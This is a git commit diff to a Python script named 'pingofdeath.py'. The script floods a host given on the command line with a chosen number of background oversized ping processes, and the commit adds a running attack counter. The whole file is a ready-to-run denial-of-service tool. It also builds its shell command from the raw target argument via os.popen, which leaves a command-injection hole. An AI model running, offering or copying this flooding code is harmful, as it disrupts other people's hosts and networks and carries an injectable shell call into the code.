85500a04f148eeaae49211a3915faf03df94fd79
Harkjin.dev <harkjin.dev@gmail.com>
2021-05-14 12:21:19 +0900

    Update pingofdeath.py

--- Python/pingofdeath.py
+++ Python/pingofdeath.py
@@ -6,11 +6,14 @@ import time
 
 target = sys.argv[1]
 try_number = int(sys.argv[2])
+now_number = 0
 
 for num in range(1,try_number+1):
     print("Ping of Death Attacking Now : [%d]"%num)
     os.popen('ping -s 60000 %s >/dev/null &'%target).read()
+    now_number += 1
 
 while True:
+    print("Attack Number Now : %d"%now_number)
     print("Stop : Ctrl + C")
     time.sleep(100000)
